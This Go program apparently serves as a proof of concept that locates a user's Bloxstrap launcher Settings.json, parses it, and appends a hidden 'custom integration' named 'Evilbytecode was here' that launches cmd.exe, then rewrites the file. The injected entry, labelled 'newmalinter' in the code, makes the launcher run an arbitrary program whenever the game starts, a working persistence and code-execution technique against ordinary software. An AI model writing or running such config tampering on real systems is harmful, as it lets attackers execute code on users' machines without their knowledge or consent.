package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"time"
)

func main() {
	usr, err := user.Current()
	if err != nil {
		return
	}

	path2bloxstrap := filepath.Join(usr.HomeDir, "AppData", "Local", "Bloxstrap", "Settings.json")

	if _, err := os.Stat(path2bloxstrap); os.IsNotExist(err) {
		fmt.Println("Settings.json file not found. User may not have Bloxstrap installed.")
		time.Sleep(5 * time.Second)
		os.Exit(-1)
	}

	data, err := ioutil.ReadFile(path2bloxstrap)
	if err != nil {
		return
	}

	type Settings struct {
		BootstrapperStyle         int  `json:"BootstrapperStyle"`
		BootstrapperIcon          int  `json:"BootstrapperIcon"`
		BootstrapperTitle         string `json:"BootstrapperTitle"`
		BootstrapperIconCustomLocation string `json:"BootstrapperIconCustomLocation"`
		Theme                     int  `json:"Theme"`
		CheckForUpdates           bool `json:"CheckForUpdates"`
		CreateDesktopIcon         bool `json:"CreateDesktopIcon"`
		MultiInstanceLaunching    bool `json:"MultiInstanceLaunching"`
		OhHeyYouFoundMe           bool `json:"OhHeyYouFoundMe"`
		Channel                   string `json:"Channel"`
		ChannelChangeMode         int  `json:"ChannelChangeMode"`
		EnableActivityTracking    bool `json:"EnableActivityTracking"`
		UseDiscordRichPresence    bool `json:"UseDiscordRichPresence"`
		HideRPCButtons            bool `json:"HideRPCButtons"`
		ShowServerDetails         bool `json:"ShowServerDetails"`
		CustomIntegrations        []struct {
			Name       string `json:"Name"`
			Location   string `json:"Location"`
			LaunchArgs string `json:"LaunchArgs"`
			AutoClose  bool   `json:"AutoClose"`
		} `json:"CustomIntegrations"`
		UseOldDeathSound         bool `json:"UseOldDeathSound"`
		UseOldCharacterSounds    bool `json:"UseOldCharacterSounds"`
		UseDisableAppPatch       bool `json:"UseDisableAppPatch"`
		UseOldAvatarBackground   bool `json:"UseOldAvatarBackground"`
		CursorType               int  `json:"CursorType"`
		EmojiType                int  `json:"EmojiType"`
		DisableFullscreenOptimizations bool `json:"DisableFullscreenOptimizations"`
	}

	var settings Settings
	err = json.Unmarshal(data, &settings)
	if err != nil {
		return
	}

	newmalinter := struct {
		Name       string `json:"Name"`
		Location   string `json:"Location"`
		LaunchArgs string `json:"LaunchArgs"`
		AutoClose  bool   `json:"AutoClose"`
	}{
		Name:       "Evilbytecode was here",
		Location:   "C:\\Windows\\System32\\cmd.exe",
		LaunchArgs: "start cmd.exe",
		AutoClose:  false,
	}

	settings.CustomIntegrations = append(settings.CustomIntegrations, newmalinter)
	updjs, err := json.MarshalIndent(settings, "", "  ")
	if err != nil {
		return
	}
	ioutil.WriteFile(path2bloxstrap, updjs, 0644)

	fmt.Println("Integration added successfully.")
}
